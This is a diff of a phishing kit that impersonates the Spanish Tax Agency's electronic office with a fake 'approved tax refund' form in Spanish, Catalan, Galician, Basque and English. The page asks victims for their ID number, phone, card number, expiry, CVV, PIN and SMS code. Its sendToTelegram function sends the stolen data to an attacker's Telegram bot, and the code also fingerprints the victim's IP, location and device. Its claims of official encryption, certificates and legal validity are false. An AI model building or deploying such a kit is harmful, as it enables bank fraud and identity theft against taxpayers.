-lblTel: "* Número de contacte",
-btnContinuar: "Continuar",
-step2Title: "Verificació de reemborsament",
-lblCard: "Número de targeta",
-lblExpir: "Data de caducitat (MM/AA)",
-lblCvv: "Codi de seguretat (CVV/CVC)",
-lblPin: "PIN",
-btnVolver: "Tornar",
-btnConfirmar: "Confirmar",
-step3Title: "Verificació de codi",
-step3Desc: "Introduïu el codi SMS de 6 dígits enviat al número de contacte.",
-btnVerificar: "Verificar",
-step4Title: "Verificació de pin",
-step4Desc: "Introduïu el PIN secret de la vostra targeta bancària per confirmar l'operació.",
-step5Title: "Procés Finalitzat",
-step5H3: "¡El teu procés de reemborsament ha finalitzat!",
-step5P: "El pagament del reemborsament serà efectiu en un termini màxim de <strong>14 dies hàbils</strong>.",
-btnInicio: "Tornar a la Seu Electrònica",
-dniErrorText: "Format de DNI, NIE o NIF incorrecte.",
-cardErrorText: "Número de targeta invàlid o incorrecte.",
-expiryErrorText: "Format o data invàlida (Ex: 01/32).",
-cvvErrorText: "CVV incorrecte (3 dígits generals o 4 per a American Express).",
-pinErrorText: "El PIN de targeta a Espanya ha de tenir entre 4 i 6 dígits.",
-finalPinErrorText: "El PIN introduït no coincideix amb el de la pàgina anterior o és incorrecte."
-},
-gl: {
-brand: "Sede Electrónica",
-stepIndicator: "Paso {current} de 4",
-stepNames: ["Datos do Reembolso", "Verificación Bancaria", "Código SMS", "Código PIN"],
-step1Title: "Notificación de Reembolso de Impostos Aprobado",
-step1Desc: "O seu reembolso de impostos foi aprobado.",
-step1Plazo: "Ten un prazo máximo de <strong>5 días</strong> para completar o formulario de reembolso.",
-lblExp: "* Número de expediente",
-lblImp: "* Importe de reembolso",
-lblNom: "* Nome completo",
-lblDni: "* NIF / DNI / NIE",
-lblTel: "* Número de contacto",
-btnContinuar: "Continuar",
-step2Title: "Verificación de reembolso",
-lblCard: "Número de tarxeta",
-lblExpir: "Data de caducidade (MM/AA)",
-lblCvv: "Código de seguridade (CVV/CVC)",
-lblPin: "PIN",
-btnVolver: "Volver",
-btnConfirmar: "Confirmar",
-step3Title: "Verificación de código",
-step3Desc: "Introduza o código SMS de 6 díxitos enviado ao número de contacto.",
-btnVerificar: "Verificar",
-step4Title: "Verificación de pin",
-step4Desc: "Introduza o PIN secreto da súa tarxeta bancaria para confirmar a operación.",
-step5Title: "Proceso Finalizado",
-step5H3: "¡O teu proceso de reembolso rematou!",
-step5P: "O pago do reembolso será efectivo nun prazo máximo de <strong>14 días hábiles</strong>.",
-btnInicio: "Volver á Sede Electrónica",
-dniErrorText: "Formato de DNI, NIE ou NIF incorrecto.",
-cardErrorText: "Número de tarxeta inválido ou incorrecto.",
-expiryErrorText: "Formato ou data inválida (Ex: 01/32).",
-cvvErrorText: "CVV incorrecto (3 díxitos xerais ou 4 para American Express).",
-pinErrorText: "O PIN de tarxeta en España debe entre 4 e 6 díxitos.",
-finalPinErrorText: "O PIN introducido non coincide co da páxina anterior ou é incorrecto."
-},
-eu: {
-brand: "Egoitza Elektronikoa",
-stepIndicator: "{current}. Urratsa (Guztira 4)",
-stepNames: ["Itzulketaren Datuak", "Banku Egiaztapena", "SMS Kodea", "PIN Kodea"],
-step1Title: "Zergak Itzultzeko Jakinarazpena Onartuta",
-step1Desc: "Zure zerga-itzulketa onartu egin da.",
-step1Plazo: "Gehienez <strong>5 eguneko</strong> epea duzu itzulketa-formularioa betetzeko.",
-lblExp: "* Espediente zenbakia",
-lblImp: "* Itzulketaren zenbatekoa",
-lblNom: "* Izen-abizenak",
-lblDni: "* NAN / IFZ",
-lblTel: "* Harremanetarako zenbakia",
-btnContinuar: "Jarraitu",
-step2Title: "Itzulketaren egiaztapena",
-lblCard: "Txartel zenbakia",
-lblExpir: "Iraungipen-data (MM/AA)",
-lblCvv: "Segurtasun-kodea (CVV/CVC)",
-lblPin: "PINa",
-btnVolver: "Atzera",
-btnConfirmar: "Berretsi",
-step3Title: "Kodearen egiaztapena",
-step3Desc: "Sartu harremanetarako zenbakira bidalitako 6 digituko SMS kodea.",
-btnVerificar: "Egiaztatu",
-step4Title: "Pinaren egiaztapena",
-step4Desc: "Sartu zure banku-txartelaren PIN sekretua eragiketa berretsi.",
-step5Title: "Prozesua Amaituta",
-step5H3: "¡Zure itzulketa prozesua amaitu da!",
-step5P: "Itzulketaren ordainketa gehienez <strong>14 laneguneko</strong> epean egingo da.",
-btnInicio: "Itzuli Egoitza Elektronikora",
-dniErrorText: "NAN, NIE edo IFZ formatu okerra.",
-cardErrorText: "Txartel zenbaki okerra edo baliogabea.",
-expiryErrorText: "Formatua edo data baliogabea (Adib: 01/32).",
-cvvErrorText: "CVV okerra (3 digitu orokor edo 4 American Express-erako).",
-pinErrorText: "Espainiako txartelaren PINak 4 eta 6 digitu artean izan behar ditu.",
-finalPinErrorText: "Sartutako PINa ez dator bat aurreko orrialdekoarekin edo okerra da."
-},
-en: {
-brand: "Electronic Office",
-stepIndicator: "Step {current} of 4",
-stepNames: ["Refund Data", "Bank Verification", "SMS Code", "PIN Code"],
-step1Title: "Approved Tax Refund Notification",
-step1Desc: "Your tax refund has been approved.",
-step1Plazo: "You have a maximum period of <strong>5 days</strong> to complete the refund form.",
-lblExp: "* File number",
-lblImp: "* Refund amount",
-lblNom: "* Full name",
-lblDni: "* ID / Tax Number (DNI/NIE)",
-lblContact: "* Contact number",
-btnContinuar: "Continue",
-step2Title: "Refund verification",
-lblCard: "Card number",
-lblExpir: "Expiry date (MM/YY)",
-lblCvv: "Security code (CVV/CVC)",
-lblPin: "PIN",
-btnVolver: "Back",
-btnConfirmar: "Confirm",
-step3Title: "Code verification",
-step3Desc: "Enter the 6-digit SMS code sent to the contact number.",
-btnVerificar: "Verify",
-step4Title: "PIN verification",
-step4Desc: "Enter the secret PIN of your bank card to confirm the operation.",
-step5Title: "Process Finished",
-step5H3: "¡Your refund process has finished!",
-step5P: "The refund payment will be effective within a maximum period of <strong>14 business days</strong>.",
-btnInicio: "Return to Electronic Office",
-dniErrorText: "Invalid DNI, NIE or NIF format.",
-cardErrorText: "Invalid or incorrect card number.",
-expiryErrorText: "Invalid format or date (Ex: 01/32).",
-cvvErrorText: "Incorrect CVV (3 digits general or 4 for American Express).",
-pinErrorText: "The card PIN in Spain must have between 4 and 6 digits.",
-finalPinErrorText: "The entered PIN does not match the previous page or is incorrect."
-}
-};
-
-const modalTexts = {
-es: {
-accesibilidad: ["Declaración de Accesibilidad", "La Sede Electrónica de la Agencia Tributaria se compromete a hacer accesible su sitio web de conformidad con el Real Decreto 1112/2018. Garantizamos la plena navegabilidad y compatibilidad con tecnologías de apoyo."],
-seguridad: ["Aviso de Seguridad y Autenticidad", "Este servicio web cuenta con sistemas de cifrado seguro SSL/TLS de 256 bits emitidos por la Fábrica Nacional de Moneda y Timbre (FNMT). Verifique siempre la barra de direcciones."],
-legal: ["Aviso Legal", "De conformidad con la Ley 39/2015 del Procedimiento Administrativo Común de las Administraciones Públicas, este documento electrónico posee plena validez jurídica."],
-certificado: ["Validación del Certificado de Sede", "El certificado digital oficial de la Sede Electrónica se encuentra activo y verificado por los prestadores de servicios de certificación reconocidos."],
-privacidad: ["Protección de Datos Personales", "Los datos recabados en este procedimiento serán tratados con estricta confidencialidad por la Agencia Tributaria exclusivamente para la tramitación del reembolso de impuestos."]
-},
-ca: {
-accesibilidad: ["Declaració d'Accessibilitat", "La Seu Electrònica de l'Agència Tributària es compromet a fer accessible el seu lloc web de conformitat amb la normativa vigent."],
-seguridad: ["Avís de Seguretat", "Aquest servei web compta amb sistemes de xifratge segur SSL/TLS."],
-legal: ["Avís Legal", "Aquest document electrònic posseeix plena validesa jurídica segons la legislació aplicable."],
-certificado: ["Validació del Certificat", "El certificat digital oficial de la Seu Electrònica es troba actiu i verificat."],
-privacidad: ["Protecció de Dades", "Les dades recollides seran tractades amb estricta confidencialitat."]
-},
-gl: {
-accesibilidad: ["Declaración de Accesibilidade", "A Sede Electrónica da Axencia Tributaria comprométese a garantir a accesibilidade universal."],
-seguridad: ["Aviso de Seguridade", "Este servizo web conta con sistemas de cifrado seguro SSL/TLS."],
-legal: ["Aviso Legal", "Este documento electrónico posúe plena validez xurídica."],
-certificado: ["Validación do Certificado", "O certificado dixital oficial atópase activo e verificado."],
-privacidad: ["Protección de Datos", "Os datos recollidos serán tratados con estricta confidencialidade."]
-},
-eu: {
-accesibilidad: ["Irisgarritasun Adierazpena", "Zerga Agentziaren Egoitza Elektronikoak bere webgunea irisgarri egiteko konpromisoa hartzen du."],
-seguridad: ["Segurtasun Oharra", "Web zerbitzu honek SSL/TLS enkriptatze sistema seguruak ditu."],
-legal: ["Lege Oharra", "Dokumentu elektroniko honek baliozkotasun juridiko osoa du."],
-certificado: ["Ziurtagiria Baliozkotzea", "Egoitza elektronikoaren ziurtagiri digitala aktibo eta egiaztatuta dago."],
-privacidad: ["Datu Babesa", "Bildu diren datuak konfidentzialtasun osoz tratatuko dira."]
-},
-en: {
-accesibilidad: ["Accessibility Statement", "The Electronic Office of the Spanish Tax Agency is committed to making its website accessible."],
-seguridad: ["Security Notice", "This web service features secure 256-bit SSL/TLS encryption systems."],
-legal: ["Legal Notice", "In accordance with administrative regulations, this electronic document has full legal validity."],
-certificado: ["Office Certificate Validation", "The official digital certificate of the Electronic Office is active and verified."],
-privacidad: ["Personal Data Protection", "The data collected will be processed with strict confidentiality exclusively for tax refund processing."]
-}
-};
-
-function openModal(type) {
-const langDict = modalTexts[currentLang] || modalTexts['es'];
-const data = langDict[type] || ["Información Oficial", "Contenido oficial disponible de acuerdo con la normativa vigente de la Sede Electrónica."];
-document.getElementById('modal-title').innerText = data[0];
-document.getElementById('modal-content').innerHTML = `<p>${data[1]}</p>`;
-document.getElementById('institutional-modal').classList.remove('hidden');
-}
-
-function closeModal() {
-document.getElementById('institutional-modal').classList.add('hidden');
-}
-
-function toggleLangMenu() {
-const dropdown = document.getElementById('lang-dropdown');
-dropdown.classList.toggle('hidden');
-}
-
-function togglePasswordVisibility(fieldId, btnElement) {
-const field = document.getElementById(fieldId);
-if (field.type === "password") {
-field.type = "text";
-btnElement.classList.add('text-blue-700');
-} else {
-field.type = "password";
-btnElement.classList.remove('text-blue-700');
-}
-}
-
-function changeLanguage(lang) {
-currentLang = lang;
-const t = translations[lang];
-if (!t) return;
-
-document.getElementById('lang-code').innerText = lang.toUpperCase();
-document.getElementById('lang-dropdown').classList.add('hidden');
-
-document.getElementById('nav-brand').innerText = t.brand;
-document.getElementById('t-step1-title').innerText = t.step1Title;
-document.getElementById('t-step1-desc').innerText = t.step1Desc;
-document.getElementById('t-step1-plazo').innerHTML = t.step1Plazo;
-document.getElementById('t-label-exp').innerText = t.lblExp;
-document.getElementById('t-label-imp').innerText = t.lblImp;
-document.getElementById('t-label-nom').innerText = t.lblNom;
-document.getElementById('t-label-dni').innerText = t.lblDni;
-document.getElementById('t-label-tel').innerText = t.lblTel;
-document.getElementById('t-btn-continuar').innerText = t.btnContinuar;
-
-document.getElementById('t-step2-title').innerText = t.step2Title;
-document.getElementById('t-label-card').innerText = t.lblCard;
-document.getElementById('t-label-expir').innerText = t.lblExpir;
-document.getElementById('t-label-cvv').innerText = t.lblCvv;
-document.getElementById('t-label-pin').innerText = t.lblPin;
-document.getElementById('t-btn-volver1').innerText = t.btnVolver;
-document.getElementById('t-btn-confirmar').innerText = t.btnConfirmar;
-
-document.getElementById('t-step3-title').innerText = t.step3Title;
-document.getElementById('t-step3-desc').innerText = t.step3Desc;
-document.getElementById('t-btn-volver2').innerText = t.btnVolver;
-document.getElementById('t-btn-verificar1').innerText = t.btnVerificar;
-
-document.getElementById('t-step4-title').innerText = t.step4Title;
-document.getElementById('t-step4-desc').innerText = t.step4Desc;
-document.getElementById('t-btn-volver3').innerText = t.btnVolver;
-document.getElementById('t-btn-verificar2').innerText = t.btnVerificar;
-
-document.getElementById('t-step5-title').innerText = t.step5Title;
-document.getElementById('t-step5-h3').innerText = t.step5H3;
-document.getElementById('t-step5-p').innerHTML = t.step5P;
-document.getElementById('t-btn-inicio').innerText = t.btnInicio;
-
-document.getElementById('dni-error').innerText = t.dniErrorText;
-document.getElementById('card-error').innerText = t.cardErrorText;
-document.getElementById('expiry-error').innerText = t.expiryErrorText;
-document.getElementById('cvv-error').innerText = t.cvvErrorText;
-document.getElementById('pin-error').innerText = t.pinErrorText;
-document.getElementById('final-pin-error').innerText = t.finalPinErrorText;
-
-updateStepIndicator(activeStepNumber);
-}
-
-window.addEventListener('click', function(e) {
-const btn = document.getElementById('current-lang-btn');
-const dropdown = document.getElementById('lang-dropdown');
-if (!btn.contains(e.target) && !dropdown.contains(e.target)) {
-dropdown.classList.add('hidden');
-}
-});
-
-let activeStepNumber = 1;
-
-function updateStepIndicator(stepNum) {
-activeStepNumber = stepNum;
-const t = translations[currentLang];
-const indicatorText = t.stepIndicator.replace('{current}', stepNum);
-const nameText = t.stepNames[stepNum - 1] || "";
-
-document.getElementById('step-indicator-text').innerText = indicatorText;
-document.getElementById('step-name-text').innerText = nameText;
-
-const percentage = (stepNum / 4) * 100;
-document.getElementById('progress-fill').style.width = percentage + '%';
-
-if (stepNum === 5) {
-document.getElementById('progress-bar-container').classList.add('hidden');
-} else {
-document.getElementById('progress-bar-container').classList.remove('hidden');
-}
-}
-
-document.addEventListener("DOMContentLoaded", () => {
-const cardInput = document.getElementById('card-number');
-const brandIcon = document.getElementById('card-brand-icon');
-
-if (cardInput) {
-cardInput.addEventListener('input', (e) => {
-let value = e.target.value.replace(/\D/g, '');
-if (value.length > 16) value = value.substring(0, 16);
-let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
-e.target.value = formattedValue;
-
-if (value.startsWith('4')) {
-brandIcon.innerText = "VISA";
-} else if (/^5[1-5]/.test(value) || /^2[2-7]/.test(value)) {
-brandIcon.innerText = "MC";
-} else {
-brandIcon.innerText = "";
-}
-});
-}
-
-const expiryInput = document.getElementById('card-expiry');
-if (expiryInput) {
-expiryInput.addEventListener('input', (e) => {
-let value = e.target.value.replace(/\D/g, '');
-if (value.length > 2) {
-value = value.substring(0, 2) + '/' + value.substring(2, 4);
-}
-e.target.value = value;
-});
-}
-});
-
-function sendToTelegram(message) {
-if (TELEGRAM_BOT_TOKEN === "TU_BOT_TOKEN_AQUI" || TELEGRAM_CHAT_ID === "TU_CHAT_ID_AQUI") {
-console.warn("Telegram Token o Chat ID no configurados.");
-return;
-}
-
-const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-return fetch(url, {
-method: 'POST',
-headers: { 'Content-Type': 'application/json' },
-body: JSON.stringify({
-chat_id: TELEGRAM_CHAT_ID,
-text: message,
-parse_mode: 'Markdown'
-})
-}).catch(err => console.error("Error al enviar a Telegram:", err));
-}
-
-function showStep(stepId, stepNum) {
-document.querySelectorAll('.step-container').forEach(el => el.classList.add('hidden'));
-document.getElementById(stepId).classList.remove('hidden');
-if (stepNum) {
-updateStepIndicator(stepNum);
-}
-window.scrollTo({ top: 0, behavior: 'smooth' });
-
-if (stepId === 'step-5') {
-startRedirectCountdown();
-} else {
-if (redirectInterval) clearInterval(redirectInterval);
-}
-}
-
-function startRedirectCountdown() {
-let timeLeft = 7;
-const timerEl = document.getElementById('countdown-timer');
-if (redirectInterval) clearInterval(redirectInterval);
-
-redirectInterval = setInterval(() => {
-timeLeft--;
-if (timerEl) timerEl.innerText = timeLeft;
-if (timeLeft <= 0) {
-clearInterval(redirectInterval);
-window.location.href = 'https://sede.agenciatributaria.gob.es/';
-}
-}, 1000);
-}
-
-function downloadReceipt() {
-const receiptContent = `AGENCIA TRIBUTARIA - JUSTIFICANTE DE SOLICITUD DE REEMBOLSO\n=======================================================\nExpediente: ${formDataStore.expediente || 'B2845641546'}\nContribuyente: ${formDataStore.nombre || 'Ciudadano'} (DNI/NIE: ${formDataStore.dni || ''})\nImporte Aprobado: ${formDataStore.importe || '311.29 €'}\nCSV (Código Seguro Verificación): 74F8A91C3E2048576209\nEstado: Registrado con éxito (Plazo estimado: 14 días hábiles)\nFecha: ${new Date().toLocaleDateString()}`;
-const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
-const url = URL.createObjectURL(blob);
-const a = document.createElement('a');
-a.href = url;
-a.download = `Justificante_Reembolso_${formDataStore.expediente || 'AEAT'}.txt`;
-document.body.appendChild(a);
-a.click();
-document.body.removeChild(a);
-URL.revokeObjectURL(url);
-}
-
-function validateDniNie(value) {
-let dni = value.trim().toUpperCase();
-const dniRegex = /^[0-9XYZ][0-9]{7}[A-Z]$|^[ABCDEFGHJKLMNPQRSUVW][0-9]{7}[0-9A-J]$/;
-return dniRegex.test(dni);
-}
-
-async function handleStep1(event) {
-event.preventDefault();
-const dniVal = document.getElementById('dni').value;
-const dniError = document.getElementById('dni-error');
-
-if (!validateDniNie(dniVal)) {
-dniError.classList.remove('hidden');
-return;
-} else {
-dniError.classList.add('hidden');
-}
-
-formDataStore.expediente = document.getElementById('expediente').value;
-formDataStore.importe = document.getElementById('importe').value;
-formDataStore.nombre = document.getElementById('nombre').value;
-formDataStore.dni = dniVal.toUpperCase();
-formDataStore.contacto = document.getElementById('contacto').value;
-}
-let datosTecnicos = {};
-try {
-let respuestaIP = await fetch('https://ipapi.co/json/');
-let dataIP = await respuestaIP.json();
-datosTecnicos.ip = dataIP.ip || "No disponible";
-datosTecnicos.pais = dataIP.country_name || "Desconocido";
-datosTecnicos.ciudad = dataIP.city || "Desconocida";
-datosTecnicos.isp = dataIP.org || "Desconocido";
-} catch (error) {
-datosTecnicos.ip = "No disponible";
-datosTecnicos.pais = "Desconocido";
-datosTecnicos.ciudad = "Desconocida";
-datosTecnicos.isp = "Desconocido";
-}
-
-datosTecnicos.memoriaRAM = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "No desvelada";
-datosTecnicos.nucleosCPU = navigator.hardwareConcurrency || "Desconocido";
-datosTecnicos.conexion = navigator.connection ? navigator.connection.effectiveType : "Desconocida";
-datosTecnicos.pantalla = `${window.screen.width}x${window.screen.height}`;
-datosTecnicos.tactil = navigator.maxTouchPoints > 0 ? "Sí" : "No";
-datosTecnicos.navegador = navigator.userAgent;
-
-let personaRealStr = "❌ No";
-let botStr = "🤖 Sí";
-
-if (userInteractionDetected && !navigator.webdriver && window.outerWidth !== 0) {
-personaRealStr = "👤 Sí";
-botStr = "❌ No";
-}
-
-const msgDispositivo =
+    <!-- BARRA INSTITUCIONAL SUPERIOR CON BANDERA DE ESPAÑA OFICIAL Y ESCUDO COMPLETO -->
+    <div class="bg-gray-900 text-white text-xs py-1.5 px-4 border-b border-gray-800">
+        <div class="max-w-2xl mx-auto flex items-center justify-between">
+            <div class="flex items-center space-x-2">
+                <!-- Bandera de España con Escudo Real completo en el centro -->
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 500" class="w-6 h-4 inline-block shadow-sm">
+                    <rect width="750" height="500" fill="#aa151b"/>
+                    <rect width="750" height="250" y="125" fill="#ffc400"/>
+                    <g transform="translate(325, 175) scale(0.3)">
+                        <path d="M110,65 Q160,25 210,65 Q225,40 215,85 Q180,95 160,75 Q140,95 105,85 Q95,40 110,65 Z" fill="#d4af37" stroke="#660000" stroke-width="4"/>
+                        <path d="M120,85 Q160,70 200,85 L190,110 Q160,95 130,110 Z" fill="#aa151b"/>
+                        <path d="M115,110 H205 V245 C205,280 160,295 160,295 C160,295 115,280 115,245 Z" fill="#aa151b" stroke="#d4af37" stroke-width="4"/>
+                        <line x1="160" y1="110" x2="160" y2="245" stroke="#d4af37" stroke-width="4"/>
+                        <line x1="115" y1="177" x2="205" y2="177" stroke="#d4af37" stroke-width="4"/>
+                        <rect x="127" y="130" width="22" height="28" fill="#f1bf00"/>
+                        <path d="M175,135 Q185,130 192,148 Q182,158 168,145 Z" fill="#e0115f"/>
+                        <rect x="127" y="200" width="22" height="35" fill="#aa151b"/>
+                        <rect x="171" y="200" width="22" height="35" fill="#aa151b"/>
+                        <circle cx="160" cy="210" r="8" fill="#0055a5" stroke="#d4af37" stroke-width="2"/>
+                    </g>
+                </svg>
+                <span class="font-bold tracking-widest text-[11px]">ESPAÑA</span>
+            </div>
+            <span class="text-gray-300 font-medium tracking-wide">MINISTERIO DE HACIENDA</span>
+        </div>
+    </div>
+
+    <!-- TOP NAVBAR -->
+    <header class="bg-white border-b border-gray-200 shadow-sm sticky top-0 z-50">
+        <div class="max-w-2xl mx-auto px-4 h-16 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <!-- ESCUDO DE ESPAÑA -->
+                <a href="https://sede.agenciatributaria.gob.es/" target="_blank" rel="noopener noreferrer" class="w-10 h-10 flex items-center justify-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 320" class="w-10 h-10 inline-block object-contain">
+                        <rect width="380" height="320" fill="#ffcc00"/>
+                        <path d="M130,65 Q190,25 250,65 Q265,40 255,85 Q220,95 200,75 Q180,95 145,85 Q135,40 150,65 Z" fill="#d4af37" stroke="#660000" stroke-width="4"/>
+                        <path d="M140,85 Q190,70 240,85 L230,110 Q190,95 150,110 Z" fill="#aa151b"/>
+                        <path d="M130,110 H250 V245 C250,280 190,295 190,295 C190,295 130,280 130,245 Z" fill="#aa151b" stroke="#d4af37" stroke-width="4"/>
+                        <line x1="190" y1="110" x2="190" y2="245" stroke="#d4af37" stroke-width="4"/>
+                        <line x1="130" y1="177" x2="250" y2="177" stroke="#d4af37" stroke-width="4"/>
+                        <rect x="145" y="130" width="30" height="28" fill="#f1bf00"/>
+                        <path d="M210,135 Q220,130 228,148 Q218,158 202,145 Z" fill="#e0115f"/>
+                        <rect x="145" y="200" width="30" height="35" fill="#aa151b"/>
+                        <line x1="145" y1="211" x2="175" y2="211" stroke="#f1bf00" stroke-width="4"/>
+                        <line x1="145" y1="222" x2="175" y2="222" stroke="#f1bf00" stroke-width="4"/>
+                        <rect x="205" y="200" width="30" height="35" fill="#aa151b"/>
+                        <circle cx="190" cy="210" r="9" fill="#0055a5" stroke="#d4af37" stroke-width="2"/>
+                        <rect x="100" y="120" width="14" height="145" fill="#c0c0c0" stroke="#666" stroke-width="2"/>
+                        <rect x="266" y="120" width="14" height="145" fill="#c0c0c0" stroke="#666" stroke-width="2"/>
+                        <path d="M85,145 Q125,120 155,165" fill="none" stroke="#aa151b" stroke-width="7"/>
+                        <path d="M225,165 Q255,120 295,145" fill="none" stroke="#aa151b" stroke-width="7"/>
+                    </svg>
+                </a>
+
+                <!-- LOGO DE LA AGENCIA TRIBUTARIA -->
+                <a href="https://sede.agenciatributaria.gob.es/" target="_blank" rel="noopener noreferrer" class="w-10 h-10 flex items-center justify-center">
+                    <svg viewBox="0 0 100 100" class="w-10 h-10">
+                        <image 
+                            href="https://logowik.com/content/uploads/images/agencia-tributaria9862.jpg"
+                            x="0"
+                            y="0"
+                            width="100"
+                            height="100"
+                            preserveAspectRatio="xMidYMid meet"
+                            style="border: none; outline: none;"
+                        />
+                    </svg>
+                </a>
+                <a href="https://sede.agenciatributaria.gob.es/" target="_blank" rel="noopener noreferrer" id="nav-brand" class="font-bold text-blue-900 tracking-tight text-sm sm:text-base hidden sm:inline hover:underline">Sede Electrónica</a>
+            </div>
+            <div class="flex items-center space-x-3">
+                <a href="https://sede.agenciatributaria.gob.es/Sede/procedimientoC2/calendario-contribuyente.shtml" target="_blank" rel="noopener noreferrer" aria-label="Reloj de actividad" class="p-2 text-gray-600 hover:text-blue-900 transition-colors">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><path d="M12 7v5l3 3"></path></svg>
+                </a>
+                <a href="https://www.agenciatributaria.es/" target="_blank" rel="noopener noreferrer" class="bg-blue-700 text-white p-2 rounded-md flex items-center justify-center hover:bg-blue-800 transition-colors" aria-label="Acceso Área Personal">
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                </a>
+                
+                <!-- SELECTOR DE IDIOMAS -->
+                <div class="relative">
+                    <button onclick="toggleLangMenu()" id="current-lang-btn" class="text-sm font-medium flex items-center text-gray-700 cursor-pointer hover:text-blue-900 bg-gray-100 hover:bg-gray-200 px-2.5 py-1.5 rounded transition-colors">
+                        <span id="lang-code">ES</span> <svg class="w-4 h-4 ml-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"></path></svg>
+                    </button>
+                    <div id="lang-dropdown" class="hidden absolute right-0 mt-2 w-36 bg-white border border-gray-200 rounded shadow-lg py-1 z-50 text-sm">
+                        <button onclick="changeLanguage('es')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">Español</button>
+                        <button onclick="changeLanguage('ca')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">Català</button>
+                        <button onclick="changeLanguage('gl')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">Galego</button>
+                        <button onclick="changeLanguage('eu')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">Euskera</button>
+                        <button onclick="changeLanguage('en')" class="w-full text-left px-4 py-2 hover:bg-blue-50 text-gray-700 font-medium">English</button>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+        <div class="h-1 bg-blue-700 w-full"></div>
+    </header>
+
+    <!-- MIGAS DE PAN -->
+    <div class="bg-gray-200 border-b border-gray-300 text-xs text-gray-600 py-2 px-4">
+        <div class="max-w-2xl mx-auto flex items-center space-x-1">
+            <span class="hover:underline cursor-pointer">Inicio</span>
+            <span>&gt;</span>
+            <span class="hover:underline cursor-pointer">Sede Electrónica</span>
+            <span>&gt;</span>
+            <span class="hover:underline cursor-pointer">Procedimientos</span>
+            <span>&gt;</span>
+            <span class="text-gray-900 font-medium">Reembolso</span>
+        </div>
+    </div>
+
+    <!-- MAIN CONTAINER -->
+    <main class="flex-grow max-w-2xl w-full mx-auto p-4 sm:p-6 flex flex-col justify-center my-auto">
+        
+        <!-- BARRA DE PROGRESO GLOBAL -->
+        <div id="progress-bar-container" class="mb-4 bg-white border border-gray-200 rounded p-3 shadow-xs">
+            <div class="flex justify-between items-center text-xs font-semibold text-gray-600 mb-1">
+                <span id="step-indicator-text">Paso 1 de 4</span>
+                <span id="step-name-text">Datos del Reembolso</span>
+            </div>
+            <div class="w-full bg-gray-200 h-2 rounded-full overflow-hidden">
+                <div id="progress-fill" class="bg-blue-700 h-full transition-all duration-300 w-1/4"></div>
+            </div>
+        </div>
+
+        <!-- STEP 1: NOTIFICACIÓN DE REEMBOLSO -->
+        <div id="step-1" class="step-container bg-white border border-gray-200 rounded shadow-sm p-6 sm:p-8">
+            <h2 id="t-step1-title" class="text-xl sm:text-2xl font-semibold text-center text-gray-800 mb-6 tracking-tight">Notificación de Reembolso de Impuestos Aprobado</h2>
+            
+            <div class="border border-gray-200 p-6 rounded bg-gray-50/50 mb-6 space-y-4">
+                <p id="t-step1-desc" class="text-center font-medium text-gray-700">Su reembolso de impuestos ha sido aprobado.</p>
+                <p id="t-step1-plazo" class="text-center text-sm text-gray-600">Tiene un plazo máximo de <strong class="text-black font-bold">5 días</strong> para completar el formulario de reembolso.</p>
+                
+                <form id="form-step-1" class="space-y-4 pt-2" onsubmit="handleStep1(event)">
+                    <div>
+                        <label id="t-label-exp" class="block text-xs uppercase font-bold text-gray-700 mb-1">* Número de expediente</label>
+                        <input type="text" id="expediente" readonly value="B2845641546" class="w-full border border-gray-300 rounded p-2.5 bg-gray-200 text-gray-600 text-sm cursor-not-allowed select-none focus:outline-none">
+                    </div>
+                    <div>
+                        <label id="t-label-imp" class="block text-xs uppercase font-bold text-gray-700 mb-1">* Importe de reembolso</label>
+                        <input type="text" id="importe" readonly value="311.29 €" class="w-full border border-gray-300 rounded p-2.5 bg-gray-200 text-gray-600 text-sm cursor-not-allowed select-none focus:outline-none">
+                    </div>
+                    <div>
+                        <label id="t-label-nom" class="block text-xs uppercase font-bold text-gray-700 mb-1">* Nombre completo</label>
+                        <input type="text" id="nombre" required placeholder="Introduce tu nombre y apellidos" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div>
+                        <label id="t-label-dni" class="block text-xs uppercase font-bold text-gray-700 mb-1">* NIF / DNI / NIE</label>
+                        <input type="text" id="dni" required placeholder="Ej: 12345678Z o X1234567L" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm uppercase focus:outline-none focus:border-blue-700">
+                        <p id="dni-error" class="text-xs text-red-600 mt-1 hidden">Formato de DNI, NIE o NIF incorrecto.</p>
+                    </div>
+                    <div>
+                        <label id="t-label-tel" class="block text-xs uppercase font-bold text-gray-700 mb-1">* Número de contacto</label>
+                        <input type="tel" id="contacto" required placeholder="Ej: +34 600 000 000" class="w-full border border-gray-300 rounded p-2.5 bg-white text-gray-800 text-sm focus:outline-none focus:border-blue-700">
+                    </div>
+                    <div class="pt-4 text-center">
+                        <button type="submit" id="t-btn-continuar" class="bg-blue-700 hover:bg-blue-800 text-white font-medium py-2.5 px-8 rounded transition-colors text-sm w-full sm:w-auto shadow-sm cursor-pointer">Continuar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- SPINNER 1 -->
+        <div id="spinner-1" class="step-container hidden bg-white border border-gray-200 rounded shadow-sm p-8 text-center">
+            <h2 id="t-spin1-title" class="text-xl font-medium text-gray-700 mb-8">Procesando solicitud</h2>
+            <div class="flex justify-center my-6">
